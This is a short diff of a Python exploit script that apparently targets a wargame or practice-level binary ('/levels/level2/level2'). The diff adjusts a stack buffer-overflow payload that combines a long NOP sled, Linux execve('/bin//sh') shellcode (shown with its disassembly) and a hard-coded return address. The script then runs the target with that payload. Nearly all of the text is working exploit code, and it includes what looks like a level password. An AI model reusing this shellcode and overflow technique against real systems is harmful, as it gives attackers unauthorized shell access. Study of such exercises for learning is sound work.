@@ -19,7 +19,6 @@ import os
 
 level2 = 'fsckmelogic '
 nop = '\x90'
-shellcode = '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'
 '''
 xor     eax, eax
 push    eax
@@ -33,7 +32,11 @@ cdq
 mov     al, 0Bh
 int     80h	; LINUX - sys_execve
 '''
-ret = '\xc4\xd9\xff\xbf'
+shellcode = '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'
+'''
+0xbfffcd34
+'''
+ret = '\x34\xcd\xff\xbf'
 payload = level2 + nop * 4084 + shellcode + ret
 
 os.system('/levels/level2/level2 ' + payload)
